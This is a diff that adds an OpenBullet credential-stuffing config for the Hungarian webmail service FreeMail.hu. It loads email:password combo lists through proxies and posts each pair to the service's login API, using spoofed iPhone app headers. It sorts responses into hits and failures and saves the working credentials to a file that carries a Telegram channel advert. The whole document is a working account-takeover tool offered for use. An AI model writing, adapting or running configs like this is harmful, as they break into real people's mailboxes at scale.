@@ -1,0 +1,63 @@
+[SETTINGS]
+{
+  "Name": "FreeMail.hu",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2023-11-18T13:51:46.6340914+03:30",
+  "AdditionalInfo": "Telegram Channel: t.me/OpenBulletChannel | Save Hits | CPM Rate : 200-2000",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#P REQUEST POST "https://accounts.freemail.hu/a/api/login?client_id=9" AutoRedirect=FALSE 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Host: accounts.freemail.hu" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Origin: ionic://app.freemail.hu" 
+  HEADER "Content-Length: 607" 
+  HEADER "Accept-Language: en-GB,en-US;q=0.9,en;q=0.8" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Type: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" 
+
+#K KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "650" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Retry OR 
+    KEY "671" 
+
+UTILITY File "Freemail.hu Acc.txt" AppendLines "<USER>:<PASS> | Telegram Channel : t.me/OpenBulletChannel" -> VAR "Save" 
+
